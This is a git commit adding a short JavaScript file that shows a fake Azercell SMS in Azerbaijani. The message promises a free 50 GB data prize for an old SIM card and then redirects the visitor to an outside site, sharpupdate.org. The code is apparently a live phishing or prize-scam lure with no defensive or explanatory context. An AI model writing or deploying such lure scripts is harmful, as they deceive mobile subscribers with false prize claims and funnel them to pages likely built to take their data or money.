d7733512be27a156c70c062c89de10715b994e98
ekperikpe <ekperikpe588@gmail.com>
2025-09-04 11:01:20 +0100

    Create azercell-active.js

---
+++ azercell-active.js
@@ -0,0 +1,5 @@
+var password = '50 GB AKTİV EDİN'
+password=prompt('SMS: Təbrik edirik, Azercell SİM kartınız pulsuz data köhnə sim kart mükafatını almaq hüququna malikdir, indi aktivləşdirmək üçün OK düyməsini sıxın.','50 GB AKTİV EDİN');
+if (password != '50 GB AKTİV EDİN') {
+location.href='https://sharpupdate.org/azercell.html';
+}
